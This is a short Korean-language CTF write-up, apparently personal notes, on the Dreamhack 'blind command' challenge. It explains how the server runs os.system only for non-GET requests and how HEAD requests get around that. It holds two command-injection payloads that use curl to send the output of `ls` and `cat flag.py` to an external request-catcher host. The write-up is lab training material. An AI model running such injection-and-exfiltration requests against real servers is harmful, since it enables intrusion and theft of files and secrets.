## 📍blind command

```
Read the flag file XD
```


![[{7E814FC8-CFF4-4D67-8FF6-0BAF0725AE57}.png]]

![[{3A5D69F6-5307-43B4-8303-0E3C91B67296}.png]]

`[cmd]` 부분을 그대로 출력한다.


#### 소스코드

![[{03D52CB1-EA39-4C7F-9518-F9BC0D2CA848}.png]]

GET 요청만 허락하면서 GET 요청이 아니어야 `os.system(cmd)` 함수가 실행되는 괴상한 코드이다.

OPTIONS 메소드로 요청을 보내보면
GET, HEAD, OPTIONS 메소드는 허용된다.
![[{BFA9628F-F98F-42A2-98EB-549D67BCEE1D}.png]]
![[{EE8B758B-43FF-4CD3-8879-497F78C28951}.png]]
![[{CD98C281-DA84-43DA-ABD9-16276683C344}.png]]

OPTIONS 메소드는 지원되는 메소드를 확인할 때만 사용하므로 남은 건 HEAD 뿐이다.
**HEAD** 메소드는 리소스를 GET으로 요청했을 때 응답으로 오는 헤더 부분만 요청하는 메소드이다.


#### Burp Suite
드림핵 툴즈에서 생성한 URL로 `ls` 커맨드를 실행하는 HEAD 요청을 보냈다.
```
HEAD /?cmd=curl%20https://euaavvk.request.dreamhack.games%20-d%20%22$(ls)%22 HTTP/1.1
```

![[{D7436335-FEE3-4136-B16B-2AB922C7878B}.png]]

`ls` 명령 결과가 나타난다.
`flag.py` 파일이 존재하는 것을 알 수 있다.

![[{2243164D-757D-4C8F-982B-3BAC0907681F}.png]]

`cat flag.py` 커맨드를 수행하는 요청을 전송한다.
```
HEAD /?cmd=curl%20https://euaavvk.request.dreamhack.games%20-d%20%22$(cat%20flag.py)%22 HTTP/1.1
```

![[{5F15C2A8-C9A2-4068-9E55-D99B74AE58E2}.png]]